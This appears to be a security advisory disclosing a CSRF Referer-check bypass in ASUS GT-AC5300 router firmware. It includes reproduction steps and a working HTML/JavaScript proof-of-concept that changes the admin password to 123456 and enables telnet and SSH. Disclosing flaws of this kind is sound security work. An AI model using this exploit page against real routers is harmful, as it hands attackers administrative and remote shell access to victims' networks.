# ASUS GT-AC5300 Referer verification bypassed CSRF#

**vender** ：ASUS

**Firmware version**: <=3.0.0.4.384_32738

**Exploit Author**: bigbear@galaxylab.org

**Vendor Homepage**: https://www.asus.com

**Hardware Link**:https://www.asus.com/Networking/ROG-Rapture-GT-AC5300/HelpDesk_BIOS/

## Vul detail ##
Cross-site request forgery (CSRF) vulnerability in the ASUS GT-AC5300 routers with firmware<=3.0.0.4.384_32738 allow remote attackers to hijack the authentication of administrators for requests that change the administrator password via a request to start_apply.htm . the Referer verification is using to block CSRF, but we can using page_default.cgi to bypass the referer verification.

Reproduction Steps:
1. Go to your wi-fi router gateway [i.e: http://router.asus.com]
1. login with admin
1. visit the page http://x.x.x.x/hack.html will change the admin password to 123456 and enable the sshd service 。the source code of hack.html: 
```
<script src="./jquery-1.4.1.min.js"></script>
    <script type="text/javascript">
        if (1) {
            var a = $("<a href='http://router.asus.com/page_default.cgi?url=start_apply.htm?action_mode=apply\\46action_\\163cript=restart_time\\46http_passwd=123456' target='_blank'>1</a>").get(0);
            var b =$("<a href='http://router.asus.com/page_default.cgi?url=start_apply.htm?action_mode=apply\\46action_\\163cript=restart_time\\46telnetd_enable=1\\46sshd_enable=1\\46sshd_pass=1' target='_blank'>2</a>").get(0);
            var e = document.createEvent('MouseEvents');

            e.initEvent('click', true, true);
            a.dispatchEvent(e);
            b.dispatchEvent(e);
        }
    </script>
```